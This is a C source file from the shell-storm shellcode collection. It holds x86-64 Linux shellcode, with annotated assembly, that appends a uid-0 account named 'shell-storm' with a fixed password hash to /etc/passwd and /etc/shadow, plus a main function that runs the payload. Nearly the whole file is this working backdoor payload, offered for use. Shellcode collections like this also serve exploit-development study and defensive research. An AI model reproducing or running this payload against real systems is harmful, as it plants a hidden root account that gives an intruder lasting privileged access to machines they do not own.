/*
Title:  Linux/x86-64 - Add root user with password - 390 bytes
Date:   2010-06-20
Tested: Archlinux x86_64 k2.6.33
 
Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan
 
! Database of shellcodes http://www.shell-storm.org/shellcode/



Add root user with password:
                             - User: shell-storm
                             - Pass: leet
                             - id  : 0
*/

#include &lt;stdio.h&gt;


	char *SC = 
			/* open(&quot;/etc/passwd&quot;, O_WRONLY|O_CREAT|O_APPEND, 01204) */
			
			&quot;\x48\xbb\xff\xff\xff\xff\xff\x73\x77\x64&quot;       /* mov    $0x647773ffffffffff,%rbx */
			&quot;\x48\xc1\xeb\x28&quot;                               /* shr    $0x28,%rbx */
			&quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73&quot;       /* mov    $0x7361702f6374652f,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\x89\xe7&quot;                                   /* mov    %rsp,%rdi */
                        &quot;\x66\xbe\x41\x04&quot;                               /* mov    $0x441,%si */
                        &quot;\x66\xba\x84\x02&quot;                               /* mov    $0x284,%dx */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x02&quot;                                       /* mov    $0x2,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall */

                        /* write(3, &quot;shell-storm:x:0:0:shell-storm.or&quot;..., 46) */

                        &quot;\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03&quot;       /* mov    $0x3ffffffffffffff,%rdi */
                        &quot;\x48\xc1\xef\x38&quot;                               /* shr    $0x38,%rdi */
                        &quot;\x48\xbb\xff\xff\x2f\x62\x61\x73\x68\x0a&quot;       /* mov    $0xa687361622fffff,%rbx */
                        &quot;\x48\xc1\xeb\x10&quot;                               /* shr    $0x10,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x67\x3a\x2f\x3a\x2f\x62\x69\x6e&quot;       /* mov    $0x6e69622f3a2f3a67,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x73\x74\x6f\x72\x6d\x2e\x6f\x72&quot;       /* mov    $0x726f2e6d726f7473,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x30\x3a\x73\x68\x65\x6c\x6c\x2d&quot;       /* mov    $0x2d6c6c6568733a30,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x6f\x72\x6d\x3a\x78\x3a\x30\x3a&quot;       /* mov    $0x3a303a783a6d726f,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74&quot;       /* mov    $0x74732d6c6c656873,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\x89\xe6&quot;                                   /* mov    %rsp,%rsi */
                        &quot;\x48\xba\xff\xff\xff\xff\xff\xff\xff\x2e&quot;       /* mov    $0x2effffffffffffff,%rdx */
                        &quot;\x48\xc1\xea\x38&quot;                               /* shr    $0x38,%rdx */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x01&quot;                                       /* mov    $0x1,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall */

                        /* close(3) */

                        &quot;\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03&quot;       /* mov    $0x3ffffffffffffff,%rdi */
                        &quot;\x48\xc1\xef\x38&quot;                               /* shr    $0x38,%rdi */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x03&quot;                                       /* mov    $0x3,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall */

                        /* Xor */

                        &quot;\x48\x31\xdb&quot;                                   /* xor    %rbx,%rbx */
                        &quot;\x48\x31\xff&quot;                                   /* xor    %rdi,%rdi */
                        &quot;\x48\x31\xf6&quot;                                   /* xor    %rsi,%rsi */
                        &quot;\x48\x31\xd2&quot;                                   /* xor    %rdx,%rdx */

                        /* open(&quot;/etc/shadow&quot;, O_WRONLY|O_CREAT|O_APPEND, 01204) */

                        &quot;\x48\xbb\xff\xff\xff\xff\xff\x64\x6f\x77&quot;       /* mov    $0x776f64ffffffffff,%rbx */
                        &quot;\x48\xc1\xeb\x28&quot;                               /* shr    $0x28,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x2f\x65\x74\x63\x2f\x73\x68\x61&quot;       /* mov    $0x6168732f6374652f,%rbx  */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\x89\xe7&quot;                                   /* mov    %rsp,%rdi */
                        &quot;\x66\xbe\x41\x04&quot;                               /* mov    $0x441,%si */
                        &quot;\x66\xba\x84\x02&quot;                               /* mov    $0x284,%dx */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x02&quot;                                       /* mov    $0x2,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall *

                        /* write(3, &quot;shell-storm:$1$reWE7GM1$axeMg6LT&quot;..., 59) */
			
                        &quot;\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03&quot;       /* mov    $0x3ffffffffffffff,%rdi */
                        &quot;\x48\xc1\xef\x38&quot;                               /* shr    $0x38,%rdi */
                        &quot;\x48\xbb\xff\xff\xff\xff\xff\x3a\x3a\x0a&quot;       /* mov    $0xa3a3affffffffff,%rbx */
                        &quot;\x48\xc1\xeb\x28&quot;                               /* shr    $0x28,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x34\x37\x37\x38\x3a\x3a\x3a\x3a&quot;       /* mov    $0x3a3a3a3a38373734,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x5a\x30\x55\x33\x4d\x2f\x3a\x31&quot;       /* mov    $0x313a2f4d3355305a,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x73\x2f\x50\x64\x53\x67\x63\x46&quot;       /* mov    $0x4663675364502f73,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x61\x78\x65\x4d\x67\x36\x4c\x54&quot;       /* mov    $0x544c36674d657861,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x65\x57\x45\x37\x47\x4d\x31\x24&quot;	 /* mov    $0x24314d4737455765,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x6f\x72\x6d\x3a\x24\x31\x24\x72&quot;       /* mov    $0x722431243a6d726f,%rbx  */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\xbb\x73\x68\x65\x6c\x6c\x2d\x73\x74&quot;       /* mov    $0x74732d6c6c656873,%rbx */
                        &quot;\x53&quot;                                           /* push   %rbx */
                        &quot;\x48\x89\xe6&quot;                                   /* mov    %rsp,%rsi */
                        &quot;\x48\xba\xff\xff\xff\xff\xff\xff\xff\x3b&quot;       /* mov    $0x3bffffffffffffff,%rdx */
                        &quot;\x48\xc1\xea\x38&quot;                               /* shr    $0x38,%rdx */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x01&quot;                                       /* mov    $0x1,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall */		

                        /* close(3) */

                        &quot;\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03&quot;       /* mov    $0x3ffffffffffffff,%rdi */
                        &quot;\x48\xc1\xef\x38&quot;                               /* shr    $0x38,%rdi */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x03&quot;                                       /* mov    $0x3,%al */
                        &quot;\x0f\x05&quot;                                       /* syscall */

                        /* _exit(0) */

                        &quot;\x48\x31\xff&quot;                                   /* xor    %rdi,%rdi */
                        &quot;\x48\x31\xc0&quot;                                   /* xor    %rax,%rax */
                        &quot;\xb0\x3c&quot;                                       /* mov    $0x3c,%al */
                        &quot;\x0f\x05&quot;;                                      /* syscall */


int main(void)
{
        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
        (*(void(*)()) SC)();
return 0;
}
